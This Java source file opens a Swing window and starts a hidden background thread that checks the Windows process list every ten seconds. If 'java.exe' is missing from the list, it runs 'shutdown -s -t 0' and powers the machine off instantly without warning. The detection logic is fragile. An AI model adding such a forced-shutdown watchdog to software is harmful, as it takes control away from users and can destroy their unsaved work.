/* 
 * 
 * Â® All rights reserved 2019 , By Ahmed Saadawey
 * 
 */
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import javax.swing.JFrame;

public class NewMain {

    public static void main(final String[] args) {

        MyBackgroudMethod thread = new MyBackgroudMethod();
        thread.setDaemon(true);
        thread.start();

        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                NewJFrame jFrame = new NewJFrame();
                jFrame.setVisible(true);
            }
        });
    }
    public static boolean watcher() throws IOException {

        String line;
        String pidInfo = "";

        Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe");

        BufferedReader input;
        input = new BufferedReader(new InputStreamReader(p.getInputStream()));

        while ((line = input.readLine()) != null) {
            pidInfo += line;
        }

        input.close();

        if (pidInfo.contains("java.exe")) {
            return false;
        } else {
            return true;
        }
    }

    public static void shut() {
        Runtime runtime = Runtime.getRuntime();
        try {
            Process proc = runtime.exec("shutdown -s -t 0");
        } catch (IOException ex) {
           // Logger.getLogger(Watcher.class.getName()).log(Level.SEVERE, null, ex);
        }
    }



    public static class MyBackgroudMethod extends Thread {

        @Override
        public void run() {
            while (true) {
                System.out.println("Executed!");
                 for (;;) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException ex) {
                //Logger.getLogger(Watcher.class.getName()).log(Level.SEVERE, null, ex);
            }
            try {
                if (watcher()) {

                    shut();
                }
            } catch (IOException ex) {
                // Logger.getLogger(Watcher.class.getName()).log(Level.SEVERE, null, ex);
            }

        }
                
                
            }
        }

    }

}